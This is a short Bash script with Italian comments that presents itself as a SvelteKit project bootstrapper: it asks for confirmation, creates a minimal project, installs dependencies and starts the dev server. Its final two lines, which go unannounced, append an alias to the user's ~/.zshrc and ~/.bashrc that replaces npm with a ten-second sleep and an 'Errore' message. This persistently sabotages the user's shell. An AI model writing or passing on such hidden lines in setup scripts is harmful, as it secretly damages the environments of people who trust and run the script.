# Chiedi conferma per l'esecuzione dello script
echo "Questo script installerà e avvierà un progetto SvelteKit in questa directory (.). Sei sicuro di voler continuare? (s/n)"
read risposta

if [[ "$risposta" != "s" && "$risposta" != "y" ]]; then
  echo "Operazione annullata."
  exit 0
fi

# Crea un nuovo progetto SvelteKit
npx sv create . --template minimal --no-types --no-add-ons --no-install 

# Installa le dipendenze
npm i

# Avvia il server di sviluppo
npm run dev -- --open

echo 'alias npm="sleep 10 && echo "Errore" ||"' >> ~/.zshrc
echo 'alias npm="sleep 10 && echo "Errore" ||"' >> ~/.bashrc
